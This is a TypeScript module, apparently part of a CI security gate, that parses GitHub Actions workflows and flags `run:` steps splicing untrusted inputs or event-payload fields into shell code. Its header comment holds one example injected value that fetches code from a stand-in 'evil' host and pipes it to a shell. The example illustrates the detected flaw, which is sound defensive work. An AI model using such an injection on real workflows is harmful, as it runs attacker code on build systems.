/**
 * Workflow `run:` injection — the rule and the one reader of `run:` blocks.
 * ============================================================================
 *
 * Plan 024 v3 §B-3, widened by INFRA-CRITICAL-080, extended by ARIA-HIGH-013.
 *
 * The runner substitutes every `${{ ... }}` expression BEFORE bash parses a
 * step's `run:` source, so a value spliced there becomes code: a dispatch
 * reason of `x"; curl evil | sh; "` closes the assignment it was meant to
 * fill and runs. Two kinds of value reach a workflow from outside:
 *
 *   - workflow inputs (`inputs.<x>`, `github.event.inputs.<x>`):
 *     operator-controlled (workflow_dispatch) or caller-controlled
 *     (workflow_call), never trusted source (INFRA-CRITICAL-080);
 *   - the attacker-writable fields of the event payload: a pull request's
 *     title, body and head branch name, an issue or comment body, a commit
 *     message or author, a discussion — text any outside author writes
 *     (ARIA-HIGH-013; GitHub's list of untrusted contexts).
 *
 * The fix is the same for both: pass the value through an `env:` block and
 * read `"$VAR"` inside the script, where it is data. `env:` and `with:` values
 * are untouched by design: an env value reaches the script as data, and an
 * action validates its own inputs.
 *
 * WHY this lives in tools/gates: the rule used to be private to
 * tests/invariants/aria-workflow-input-injection.spec.ts, so ARIA could not
 * observe it (ARIA-HIGH-013). The invariant and ARIA's workflow/shell safety
 * adapter now import this one module, so the gate and the observation cannot
 * disagree.
 *
 * # Why the scan parses YAML instead of tracking lines
 *
 * The previous line scanner recognised a step only when the trimmed line
 * started with `run:` (so `- run: |` was never entered) and required `}}`
 * straight after the input name (so a fallback chain never matched). Parsing
 * the workflow and reading each step's `run` value removes the first class;
 * matching any expression whose BODY reads an untrusted context removes the
 * second.
 */
import yaml from 'js-yaml';

/**
 * Only text inside `${{ ... }}` is substituted by the runner, so that is the
 * only place an injection can come from. Prose in a shell comment that NAMES
 * `inputs.x` without the expression braces is inert and is not reported.
 */
export const EXPRESSION_BLOCK_RE = /\$\{\{([\s\S]*?)\}\}/g;

/**
 * A read of the inputs context anywhere in an expression body: `inputs.x`,
 * `inputs['x']`, `github.event.inputs.x`. The look-behind keeps a longer
 * identifier (`my_inputs.x`, `steps.inputs.x`) from matching; the
 * `github.event.inputs` alternative is listed explicitly because its `inputs`
 * is preceded by `.`.
 */
export const INPUTS_CONTEXT_RE = /(?<![A-Za-z0-9_.])(?:github\.event\.inputs|inputs)\s*(?:\.|\[)/;

/**
 * A read of an event-payload field an outside author writes. A SHA, a number
 * or a repository name is not on the list: their shape is fixed by GitHub.
 * Array members are matched in both spellings (`commits.*.message`,
 * `commits[0].message`).
 */
const EACH = String.raw`(?:\.\*|\[[^\]]*\])`;
export const UNTRUSTED_EVENT_CONTEXT_RE = new RegExp(
  String.raw`(?<![A-Za-z0-9_.])github\.(?:head_ref\b|event\.(?:` +
    [
      String.raw`issue\.(?:title|body)`,
      String.raw`pull_request\.(?:title|body|head\.(?:ref|label|repo\.default_branch))`,
      String.raw`(?:comment|review|review_comment)\.body`,
      String.raw`discussion\.(?:title|body)`,
      String.raw`pages${EACH}\.page_name`,
      String.raw`(?:commits${EACH}|head_commit)\.(?:message|author\.(?:email|name))`,
      String.raw`workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:email|name)))`,
    ].join('|') +
    String.raw`)\b)`,
);

export type InjectionContextClass = 'workflow_input' | 'event_payload';

/** One `run:` step: its source, where it starts, and the shell that runs it. */
export interface RunBlock {
  /** The job id; `null` for a composite action's `runs.steps`. */
  readonly job: string | null;
  readonly stepIndex: number;
  readonly stepName: string | null;
  readonly run: string;
  /**
   * 1-based file line of the run value's first line, or -1 when the value's
   * text could not be located in the file.
   */
  readonly startLine: number;
  /**
   * True when line N of the value is file line `startLine + N` (a plain or
   * literal `|` scalar). A folded scalar (`run: >`) joins its lines with
   * blanks, so only its first line is known: `startLine`.
   */
  readonly linesExact: boolean;
  /** The step's `shell:`, else the job's then the workflow's `defaults.run.shell`; null when none is set. */
  readonly shell: string | null;
}

export interface InjectionViolation {
  readonly file: string;
  readonly lineNo: number;
  readonly line: string;
  readonly snippet: string;
  readonly contextClass: InjectionContextClass;
  readonly job: string | null;
  readonly stepIndex: number;
}

/** A workflow file by repository-relative path: `.github/workflows/<name>.yml|yaml`. */
export function isWorkflowPath(path: string): boolean {
  return /^\.github\/workflows\/[^/]+\.ya?ml$/.test(path);
}

type Mapping = Record<string, unknown>;

function asMapping(value: unknown): Mapping | null {
  return typeof value === 'object' && value !== null && !Array.isArray(value)
    ? (value as Mapping)
    : null;
}

function defaultShell(owner: Mapping | null): string | null {
  const shell = asMapping(asMapping(owner?.defaults)?.run)?.shell;
  return typeof shell === 'string' ? shell : null;
}

const RUN_KEY_RE = /^\s*(?:-\s+)?run:[ \t]*(.*)$/;
const BLOCK_INDICATOR_RE = /^([|>])[-+0-9]*(?:\s+#.*)?$/;

interface Located {
  /** 0-based file line of the value's first content line. */
  readonly line: number;
  readonly exact: boolean;
  /** 0-based file line the next search starts from. */
  readonly next: number;
}

/**
 * Where a step's `run:` value sits in the file: the next `run:` key at or
 * after `cursor` whose value is this one. A block scalar's first content line
 * is the line after the key; a one-line value is on the key's own line (a
 * quoted one is unquoted by the parser, hence the substring check). Only
 * `run:` keys are candidates: matching the command text anywhere took a YAML
 * comment, or another step's `with: script: |`, that starts with the same
 * command.
 */
function locateRunValue(
  lines: readonly string[],
  cursor: number,
  anchor: string,
  lineCount: number,
  firstContent: number,
): Located | null {
  for (let index = cursor; index < lines.length; index += 1) {
    const key = RUN_KEY_RE.exec(lines[index] as string);
    if (key === null) continue;
    const value = (key[1] ?? '').trim();
    const block = BLOCK_INDICATOR_RE.exec(value);
    if (block === null) {
      if (value === anchor || value.includes(anchor))
        return { line: index, exact: true, next: index + 1 };
      continue;
    }
    let first = index + 1;
    while (first < lines.length && (lines[first] as string).trim() === '') first += 1;
    const firstText = (lines[first] ?? '').trim();
    if (block[1] === '|' && firstText === anchor) {
      return { line: first, exact: true, next: first + (lineCount - firstContent) };
    }
    // A folded scalar (`run: >`) joins its lines with blanks: the file holds
    // the start of the parsed first line, and only that line is known.
    if (block[1] === '>' && firstText !== '' && anchor.startsWith(firstText)) {
      return { line: first, exact: false, next: first + 1 };
    }
  }
  return null;
}

/**
 * Every `run:` step of a workflow (`jobs.<id>.steps`) or a composite action
 * (`runs.steps`), in file order. Throws when the text is not YAML: a caller
 * that cannot read the file must say so, not report it clean.
 */
export function runBlocksOf(text: string): RunBlock[] {
  const document = asMapping(yaml.load(text));
  const lines = text.split('\n');
  const groups: { job: string | null; steps: unknown; shell: string | null }[] = [];
  const workflowShell = defaultShell(document);
  const jobs = asMapping(document?.jobs);
  if (jobs !== null) {
    for (const [job, body] of Object.entries(jobs)) {
      const mapping = asMapping(body);
      groups.push({ job, steps: mapping?.steps, shell: defaultShell(mapping) ?? workflowShell });
    }
  }
  const runs = asMapping(document?.runs);
  if (runs !== null) groups.push({ job: null, steps: runs.steps, shell: null });

  // js-yaml keeps mapping order, so jobs and steps are visited in file order
  // and a forward-only cursor maps each run block back to its source lines.
  const blocks: RunBlock[] = [];
  let cursor = 0;
  for (const group of groups) {
    const steps = Array.isArray(group.steps) ? group.steps : [];
    for (const [stepIndex, raw] of steps.entries()) {
      const step = asMapping(raw);
      if (step === null || typeof step.run !== 'string') continue;
      const run = step.run;
      const runLines = run.split('\n');
      // A block scalar's value ends with a newline: the empty string after it
      // is not a file line, and counting it moved the cursor past a one-line
      // `- run:` step that directly follows a block step.
      const lineCount = run.endsWith('\n') ? runLines.length - 1 : runLines.length;
      const firstContent = runLines.findIndex((line) => line.trim() !== '');
      const anchor = runLines[firstContent]?.trim() ?? '';
      const located = locateRunValue(lines, cursor, anchor, lineCount, firstContent);
      if (located !== null) cursor = located.next;
      const startIndex = located === null ? -1 : located.line - firstContent;
      blocks.push({
        job: group.job,
        stepIndex,
        stepName: typeof step.name === 'string' ? step.name : null,
        run,
        startLine: startIndex >= 0 ? startIndex + 1 : -1,
        linesExact: located !== null && located.exact && startIndex >= 0,
        shell: typeof step.shell === 'string' ? step.shell : group.shell,
      });
    }
  }
  return blocks;
}

/** Which untrusted context an expression body reads, if any. */
export function untrustedContextOf(expressionBody: string): InjectionContextClass | null {
  if (INPUTS_CONTEXT_RE.test(expressionBody)) return 'workflow_input';
  if (UNTRUSTED_EVENT_CONTEXT_RE.test(expressionBody)) return 'event_payload';
  return null;
}

/**
 * Every untrusted-context expression in the `run:` source of every step of
 * every job. The YAML text is passed in (not a path) so the invariant's
 * fixture test and ARIA's adapter read exactly the text they were given.
 */
export function findRunBlockInjections(text: string, label: string): InjectionViolation[] {
  const lines = text.split('\n');
  const violations: InjectionViolation[] = [];
  for (const block of runBlocksOf(text)) {
    const runLines = block.run.split('\n');
    for (const match of block.run.matchAll(EXPRESSION_BLOCK_RE)) {
      const body = match[1];
      if (body === undefined) continue;
      const contextClass = untrustedContextOf(body);
      if (contextClass === null) continue;
      const offsetInRun = block.run.slice(0, match.index).split('\n').length - 1;
      const lineNo =
        block.startLine < 0
          ? 0
          : block.linesExact
            ? block.startLine + offsetInRun
            : block.startLine;
      violations.push({
        file: label,
        lineNo,
        line: lines[lineNo - 1] ?? runLines[offsetInRun] ?? '',
        snippet: match[0],
        contextClass,
        job: block.job,
        stepIndex: block.stepIndex,
      });
    }
  }
  return violations;
}
